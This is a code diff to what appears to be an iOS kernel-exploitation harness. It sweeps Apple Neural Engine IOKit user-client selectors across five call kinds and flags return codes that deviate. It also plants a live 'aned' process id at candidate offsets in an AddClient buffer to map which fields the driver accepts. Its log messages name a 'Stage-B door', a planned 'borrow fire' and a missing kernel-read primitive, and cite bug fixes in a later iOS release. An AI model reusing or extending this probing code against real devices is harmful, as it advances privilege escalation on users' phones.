@@ -27,7 +27,7 @@
 #import <unistd.h>
 #import <stdarg.h>
 
-#define P109_BUILD @"p109-ane-selsweep-v7-outsize"
+#define P109_BUILD @"p109-ane-selsweep-v8-methodkinds"
 
 typedef mach_port_t io_object_t;
 typedef mach_port_t io_service_t;
@@ -39,6 +39,21 @@ typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
 typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
 typedef kern_return_t (*IOConnectCallStructMethod_t)(io_connect_t, uint32_t,
         const void *, size_t, void *, size_t *);
+typedef kern_return_t (*IOConnectCallScalarMethod_t)(io_connect_t, uint32_t,
+        const uint64_t *, uint32_t, uint64_t *, uint32_t *);
+typedef kern_return_t (*IOConnectCallAsyncStructMethod_t)(io_connect_t, uint32_t,
+        mach_port_t, const void *, size_t, void *, size_t *);
+typedef kern_return_t (*IOConnectCallAsyncScalarMethod_t)(io_connect_t, uint32_t,
+        mach_port_t, const uint64_t *, uint32_t, uint64_t *, uint32_t *);
+/* v8 METHOD-KIND LAW (v7 receipt): struct methods accept ONLY sel0 0x88/0x88
+   zeros (AddClient); every other sel bounces structural on all sizes — so
+   the Stage-B send path (request-type array) is a different METHOD KIND.
+   A sel that returns a kind-specific kr to scalar/async/memory but stays
+   2c2 under struct names its true dispatch slot. */
+typedef void *lt_io_buf_ptr_t;
+typedef kern_return_t (*IOConnectCallMemoryMethod_t)(io_connect_t, uint32_t,
+        const void *, size_t, void *, size_t *,
+        lt_io_buf_ptr_t, size_t, lt_io_buf_ptr_t *, size_t *);
 
 static int p109_fd = -1;
 static NSMutableString *p109_buf = nil;
@@ -101,6 +116,19 @@ static NSString *p109_krname(kern_return_t kr) {
         return p109_buf;
     }
     p109_log([LabDeviceProfile identBlock]);
+    /* v8 pid knob: Documents/p109_pid.txt holds the live aned pid (Term
+       Lite `ps` feeds it). zeros = honest, no pid fire. */
+    uint32_t p109Pid = 0;
+    {
+        NSString *docs = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+        NSString *pidPath = [docs stringByAppendingPathComponent:@"p109_pid.txt"];
+        NSString *txt = [NSString stringWithContentsOfFile:pidPath
+                             encoding:NSUTF8StringEncoding error:nil];
+        p109Pid = (uint32_t)[txt intValue];
+        p109_log([NSString stringWithFormat:@"[pid knob] p109_pid.txt pid=%u %@",
+                  p109Pid, p109Pid ? @"(live — pid rows armed)" : @"(zeros — pid rows all-zero)"]);
+    }
 
     void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
     if (!h) { p109_log(@"dlopen IOKit FAIL"); goto done; }
@@ -110,6 +138,13 @@ static NSString *p109_krname(kern_return_t kr) {
     IOServiceClose_t pClose = dlsym(h, "IOServiceClose");
     IOObjectRelease_t pRelease = dlsym(h, "IOObjectRelease");
     IOConnectCallStructMethod_t pStruct = dlsym(h, "IOConnectCallStructMethod");
+    IOConnectCallScalarMethod_t pScalar = dlsym(h, "IOConnectCallScalarMethod");
+    IOConnectCallAsyncStructMethod_t pAsyncStruct = dlsym(h, "IOConnectCallAsyncStructMethod");
+    IOConnectCallAsyncScalarMethod_t pAsyncScalar = dlsym(h, "IOConnectCallAsyncScalarMethod");
+    IOConnectCallMemoryMethod_t pMem = dlsym(h, "IOConnectCallMemoryMethod");
+    void *(*pPortCreate)(mach_port_t) = dlsym(h, "IONotificationPortCreate");
+    mach_port_t (*pPortMach)(void *) = dlsym(h, "IONotificationPortGetMachPort");
+    void (*pPortDestroy)(void *) = dlsym(h, "IONotificationPortDestroy");
     mach_port_t *pMainPort = dlsym(h, "kIOMainPortDefault");
     if (!pMainPort) pMainPort = dlsym(h, "kIOMasterPortDefault");
     if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pStruct || !pMainPort) {
@@ -179,7 +214,7 @@ static NSString *p109_krname(kern_return_t kr) {
                DEADBEEF filler kept for the big shapes (probing the +0x180
                pid band). First row per conn = the exact p151 sel0
                replication (zeros 0x88/0x88, pid=0) as the control. */
-            const size_t sizes[5] = { 0x88, 0x68, 0x200, 0x400, 0x800 };
+            (void)0; /* v7 size lattice retired — the v7 receipt pinned the structural law */
             /* control row: exact p151 receipt — sel0, 0x88 in/out, zeros */
             {
                 static uint8_t in[0x88];
@@ -197,34 +232,82 @@ static NSString *p109_krname(kern_return_t kr) {
                     (kr == KERN_SUCCESS ? @"p151 REPLICATED (AddClient accepted)" :
                      @"NOT replicated — shape law differs this boot (record it)")]);
             }
+            /* v8 METHOD-KIND sweep: 5 call kinds per sel, all with the
+               v7 out-size law (struct out = in exactly). Kind tags:
+               st = struct(0x88 zeros), sc = scalar, as = async struct,
+               am = async scalar, om = OOL memory. The AddClient shape law
+               (sel0/0x88/0x88/zeros) is the registered baseline from the
+               ctrl row; a sel whose AS/SC/OM kr differs from its ST 2c2
+               names its real dispatch kind. Bounded: 214 x 5 calls. */
+            void *notifPort = pPortCreate ? pPortCreate(*pMainPort) : NULL;
+            mach_port_t notifyPort = (notifPort && pPortMach) ? pPortMach(notifPort) : 0;
+            static uint8_t st_in[0x88];
+            static uint8_t st_out[0x88];
+            memset(st_in, 0, sizeof st_in);
+            static uint8_t om_out[0x1000];
             for (uint32_t sel = 0; sel <= 213; sel++) {
+                memset(st_out, 0, sizeof st_out);
+                size_t osz = sizeof st_out;
+                kern_return_t kr_st = pStruct(conn, sel, st_in, 0x88, st_out, &osz);
+
+                uint64_t sc_in[4] = {0,0,0,0};
+                uint64_t sc_out[8] = {0};
+                uint32_t sc_cnt = 8;
+                kern_return_t kr_sc = pScalar ?
+                    pScalar(conn, sel, sc_in, 4, sc_out, &sc_cnt) : 0xe00002be;
+
+                memset(st_out, 0, sizeof st_out);
+                osz = sizeof st_out;
+                kern_return_t kr_as = (pAsyncStruct && notifyPort) ?
+                    pAsyncStruct(conn, sel, notifyPort, st_in, 0x88, st_out, &osz) : 0xe00002be;
+
+                memset(sc_out, 0, sizeof sc_out);
+                sc_cnt = 8;
+                kern_return_t kr_am = (pAsyncScalar && notifyPort) ?
+                    pAsyncScalar(conn, sel, notifyPort, sc_in, 4, sc_out, &sc_cnt) : 0xe00002be;
+
+                memset(st_in, 0, sizeof st_in);   /* OOL payload: zeros 0x88 */
+                memset(st_out, 0, sizeof st_out);
+                static lt_io_buf_ptr_t om_ret = NULL;
+                om_ret = NULL;
+                size_t om_cnt = sizeof om_out;
+                kern_return_t kr_om = pMem ?
+                    pMem(conn, sel, st_in, 0x88, st_out, &osz, st_in, 0x88, &om_ret, &om_cnt) : 0xe00002be;
+
+                int deviant = !(kr_sc == kr_st && kr_as == kr_st && kr_am == kr_st && kr_om == kr_st);
                 NSMutableString *line = [NSMutableString
-                    stringWithFormat:@"[sel %2u]", sel];
-                for (int sz_i = 0; sz_i < 5; sz_i++) {
-                    size_t sz = sizes[sz_i];
-                    static uint8_t in[0x800];
-                    static uint8_t out[0x1000];
-                    memset(out, 0, sizeof out);
-                    if (sz > 0x180) {
-                        uint32_t *w = (uint32_t *)in;
-                        for (size_t k = 0; k < sz/4; k++) w[k] = 0xDEADBEEFu;
-                    } else {
-                        memset(in, 0, sizeof in);
-                    }
-                    /* v7 OUT-SIZE LAW (v6 receipt decode): the ctrl row
-                       passed (kr=0) with out=0x88 EXACTLY; the identical
-                       sel0/0x88 zeros call inside the sweep used
-                       outSz=0x1000 and returned 2c2. The LB validates the
-                       OUTPUT size too — out must match the shape exactly.
-                       v7: osz = sz (in==out per shape). */
-                    size_t osz = sz;
-                    kern_return_t kr = pStruct(conn, sel, in, sz, out, &osz);
-                    NSString *lbl = (sz == 0x88 ? @"s88z" : (sz == 0x68 ? @"s68z" :
-                        (sz == 0x200 ? @"s200d" : (sz == 0x400 ? @"s400d" : @"s800d"))));
-                    [line appendFormat:@" %@=%@", lbl, p109_krname(kr)];
-                }
+                    stringWithFormat:@"[sel %3u] st=%@ sc=%@ as=%@ am=%@ om=%@%@",
+                    sel, p109_krname(kr_st), p109_krname(kr_sc),
+                    p109_krname(kr_as), p109_krname(kr_am), p109_krname(kr_om),
+                    deviant ? @"  <DEVIANT" : @""];
                 p109_log(line);
             }
+            /* v8 pid rows: sel0 AddClient shape with the live aned pid
+               written at three candidate offsets (0x60/0x78/0x80) that sit
+               inside the 0x88 accepted shape. Non-zero content may trip the
+               content law (2c2) — that is itself the mapping verdict. */
+            {
+                static const size_t pidOffs[3] = { 0x60, 0x78, 0x80 };
+                for (int oi = 0; oi < 3; oi++) {
+                    static uint8_t pin[0x88];
+                    static uint8_t pout[0x88];
+                    memset(pin, 0, sizeof pin);
+                    memset(pout, 0, sizeof pout);
+                    uint32_t pid = p109Pid;
+                    memcpy(pin + pidOffs[oi], &pid, sizeof pid);
+                    size_t osz = sizeof pout;
+                    kern_return_t kr = pStruct(conn, 0, pin, sizeof pin, pout, &osz);
+                    uint8_t o0[9]; memcpy(o0, pout, 8); o0[8] = 0;
+                    p109_log([NSString stringWithFormat:
+                        @"[pid sel0 +%#zu] pid=%u zeros kr=%@ osz=%zu out0=%02x%02x%02x%02x — %@",
+                        pidOffs[oi], pid, p109_krname(kr), osz,
+                        pout[0], pout[1], pout[2], pout[3],
+                        (kr == KERN_SUCCESS ? @"ACCEPTED with pid — field tolerance" :
+                         kr == 0xe00002c2 ? @"2c2 — content law rejects non-zero here" :
+                         @"kind switch — MAPPED field")]);
+                }
+            }
+            if (notifPort && pPortDestroy) pPortDestroy(notifPort);
             p109_log([NSString stringWithFormat:@"[svc %@ type %u] sweep done — verdicts above", @(kServices[sv]), kTypes[ti]]);
             pClose(conn);
         }
@@ -232,6 +315,9 @@ static NSString *p109_krname(kern_return_t kr) {
     }
 done:
     p109_log(@"=== VERDICT: sels with STAGE-B-HIT(2f0) = the Stage-B door; ===");
+    p109_log(@"v8: method-kind law — the AddClient struct row is accepted only at sel0;");
+    p109_log(@"  a deviant kind-column names the real dispatch path; pid rows map the");
+    p109_log(@"  tolerable non-zero fields inside the 0x88 AddClient shape.");
     p109_log(@"v4 adds: T8150/24A435 H16 service names + UC types 0..4 (the direct-UC");
     p109_log(@"  reachability answer for 43748-out-of-framework + 112696/84494, both 27.2-only fixes).");
     p109_log(@"next: same sel with pid=aned/launchd (kern.proc) = the borrow fire. hasKread stays NO.");
